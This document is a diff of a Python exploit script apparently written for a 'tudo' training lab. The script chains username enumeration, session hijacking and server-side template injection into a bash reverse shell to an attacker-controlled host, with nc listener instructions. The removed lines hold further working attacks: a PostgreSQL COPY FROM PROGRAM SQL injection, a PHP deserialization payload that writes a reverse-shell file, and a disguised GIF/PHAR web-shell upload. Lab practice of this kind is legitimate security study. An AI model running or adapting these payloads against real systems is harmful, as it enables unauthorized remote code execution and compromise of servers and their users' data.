@@ -1,10 +1,15 @@
 #!/usr/bin/python
 
+'''
+Instructions:
+1. set USERNAME_LIST_FP
+2. Run: nc -lvnp 3333
+3. Run: python sqli-sess_hijack-ssti-rce.py
+'''
+
 import sys
 import requests
 import socket
-import random
-import string
 
 url = 'http://10.25.1.7:80'
 USERNAME_LIST_FP = '/home/kali/labs/tudo/username_list.txt' # username list
@@ -13,9 +18,6 @@ USER1_PASSWORD = 'password123'
 LHOST = '192.168.26.130'
 LPORT = '443'
 LPORT_RCE_SSTI = '3333'
-LPORT_RCE_FILE_UPLOAD = '4444'
-LPORT_RCE_SQLI = '5555'
-LPORT_RCE_DESERIALIZE = '7777'
 
 proxies = {
 	'http': '127.0.0.1:8080',
@@ -134,27 +136,6 @@ def get_admin_session(admin_cookie):
 	return s
 
 
-def generate_random_string(length):
-    characters = string.ascii_letters + string.digits
-    random_string = ''.join(random.choice(characters) for _ in range(length))
-    return random_string
-
-
-def get_rce_userobj(lhost, lport):
-	rce_filename = f"{generate_random_string(5)}.php"
-	rce_fp = f"/var/www/html/{rce_filename}"
-	rce_payload = f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>"
-
-	serialize_obj = f"O:3:\"Log\":2:{{s:1:\"f\";s:{len(rce_fp)}:\"{rce_fp}\";s:1:\"m\";s:{len(rce_payload)}:\"{rce_payload}\";}}"
-
-	return serialize_obj, rce_filename
-
-
-def import_user(s, payload):
-	data = {"userobj":payload}
-	r = s.post(f"{url}/admin/import_user.php",data=data)
-
-
 def get_ssti_motd(lhost, lport):
 	return f"{{php}}exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");{{/php}}"
 
@@ -164,42 +145,8 @@ def update_motd(s, payload):
 	r = s.post(f"{url}/admin/update_motd.php", data=data)
 
 
-def get_psql_rce_by_sqli(lhost, lport):
-	rce_table = f"zz{generate_random_string(5).lower()}" # valid table name format
-
-	sqli_queries = [
-		"';",
-		f"DROP TABLE IF EXISTS {rce_table};",
-		f"CREATE TABLE {rce_table}(cmd text);",
-		f"COPY {rce_table} FROM PROGRAM ",
-		f"'echo \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\" | bash';",
-		f"DROP TABLE IF EXISTS {rce_table}; -- "
-	]
-
-	injection_str = "".join(sqli_queries)
-	print(f"[+] sending PSQL RCE SQLi payload: {injection_str}\n")
-	data = {"username":injection_str}
-	r = requests.post(f"{url}/forgotusername.php", data=data, proxies=proxies, verify=False)
-
-
-def generate_image_web_shell_payload():
-	return f"GIF87a;\n<?php system($_GET['cmd']); ?>"
-
-
-def upload_image(s, payload):
-	web_shell_filename = f"{generate_random_string(8)}.phar"
-	files = {
-		"image":(web_shell_filename,payload,"image/gif"),
-	}
-
-	print(f"[+] uploading {web_shell_filename} to {url}/images/{web_shell_filename}")
-	r = s.post(f"{url}/admin/upload_image.php",files=files,allow_redirects=False)
-	if "Success" in r.text:
-		print(f"[+] upload image success to {url}/images/{web_shell_filename}\n")
-		return True
-	return False
-
-
+def get_index_page(s):
+	s.get(f"{url}")
 
 def main():
 	valid_users = enumerate_user(USERNAME_LIST_FP)
@@ -268,22 +215,10 @@ def main():
 	print(f"[+] SSTI payload: {ssti_payload}")
 	update_motd(admin_s, ssti_payload)
 	print(f"[+] updated MOTD for SSTI, go to {url}/index.php for reverse conn at {LHOST}/{LPORT_RCE_SSTI}\n")
-	
-
-	# RCE - File Upload -> run: nc -lvnp 4444
-	img_payload = generate_image_web_shell_payload()
-	if not upload_image(admin_s, img_payload):
-		print("[+] upload image failed\n")
+	print(f"[+] triggering SSTI...")
+	get_index_page(admin_s)
 
 
-	# RCE - SQLi -> run: nc -lvnp 5555
-	get_psql_rce_by_sqli(LHOST, LPORT_RCE_SQLI)
-
-	# RCE - insecure deserialization -> run: nc -lvnp 7777
-	userobj, rce_filename = get_rce_userobj(LHOST, LPORT_RCE_DESERIALIZE)
-	print(f"[+] serialized userobj: {userobj}")
-	import_user(admin_s, userobj)
-	print(f"[+] imported user for insecure deserialization, go to {url}/{rce_filename} for reverse conn at {LHOST}/{LPORT_RCE_DESERIALIZE}")
 
 
 if __name__ == "__main__":
